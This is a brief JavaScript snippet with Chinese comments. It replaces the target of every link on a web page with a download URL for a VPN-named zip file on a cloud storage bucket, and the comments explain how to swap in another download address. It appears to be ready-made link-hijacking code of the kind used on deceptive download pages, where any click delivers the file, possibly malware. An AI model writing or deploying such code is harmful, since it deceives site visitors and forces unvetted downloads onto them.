 

var xz = "https://pub-dc838c6325dd43d8bbce73892893a599.r2.dev/Iatsvpn-Latest.zip";

//可以把   https://pub-dc838c6325dd43d8bbce73892893a599.r2.dev/Iatsvpn-Latest.zip  这个改成下载地址；https://pub-dc838c6325dd43d8bbce73892893a599.r2.dev/Iatsvpn-Latest.zip
//可以把   https://pub-dc838c6325dd43d8bbce73892893a599.r2.dev/Iatsvpn-Latest.zip  这个改成文件下载：https://pub-dc838c6325dd43d8bbce73892893a599.r2.dev/Iatsvpn-Latest.zip



var links = document.getElementsByTagName("a");
for (var i = 0; i < links.length; i++) {
    if (links[i].hasAttribute("href")) {
        links[i].href = xz;
    }
} 
